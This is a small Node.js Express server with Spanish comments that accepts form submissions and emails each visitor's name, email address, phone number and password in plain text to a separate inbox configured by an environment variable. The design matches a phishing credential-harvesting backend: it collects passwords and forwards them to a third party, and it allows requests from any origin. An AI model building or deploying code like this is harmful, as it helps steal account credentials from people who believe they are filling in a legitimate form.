require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000; // Vercel asigna automáticamente un puerto dinámico

app.use(cors());
app.use(express.json()); // Para manejar JSON en las solicitudes

// Configurar el transporte de Nodemailer
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Ruta para recibir datos y enviar el correo
app.post("/enviar-correo", async (req, res) => {
  try {
    const { nombre, apellido, correo, contrasena, telefono } = req.body;

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_DESTINO,
      subject: "Nuevo formulario recibido",
      text: `Nombre: ${nombre}\nApellido: ${apellido}\nCorreo: ${correo}\nContraseña: ${contrasena}\nTeléfono: ${telefono}`,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("Correo enviado:", info.response);

    res.json({ message: "Correo enviado con éxito" });
  } catch (error) {
    console.error("Error al enviar el correo:", error);
    res.status(500).json({ message: "Error al enviar el correo", error });
  }
});

// Endpoint de prueba para verificar si el servidor funciona
app.get("/", (req, res) => {
  res.send("¡Servidor funcionando en Vercel!");
});

// Iniciar servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en el puerto ${PORT}`);
});
